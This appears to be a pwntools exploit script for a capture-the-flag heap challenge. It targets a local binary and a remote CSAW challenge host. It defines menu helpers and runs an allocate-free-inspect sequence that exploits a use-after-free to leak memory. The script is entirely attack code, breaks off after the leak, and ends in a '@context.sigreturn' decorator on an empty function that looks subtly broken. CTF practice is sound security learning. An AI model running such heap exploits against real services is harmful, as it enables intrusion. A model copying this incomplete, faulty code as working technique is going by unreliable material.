from pwn import *
context.log_level='debug'
context.binary = ELF('/home/ctfplayer/workspace/hb/thermite-charge')
libc = ELF('/home/ctfplayer/workspace/hb/libc-2.31.so')

def start():
    if args.REMOTE:
        return remote('hells-bells.chal.csaw.io', 1024)
    return process(['/home/ctfplayer/workspace/hb/thermite-charge'], cwd='/home/ctfplayer/workspace/hb')

io = start()

def plant(slot, size, data=None):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'slot (0-15): ', str(slot).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    if data is not None:
        io.sendafter(b'new payload: ', data)
    else:
        io.sendlineafter(b'new payload: ', b'')

def defuse(slot):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'slot: ', str(slot).encode())

def rewire(slot, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'slot: ', str(slot).encode())
    io.sendafter(b'new payload: ', data)

def inspect(slot):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'slot: ', str(slot).encode())

def leave():
    io.sendlineafter(b'> ', b'5')

if __name__ == '__main__':
    plant(0, 0x90, b'A'*0x90)
    defuse(0)
    # inspect to leak
    inspect(0)
    @context.sigreturn
    def dummy(): pass
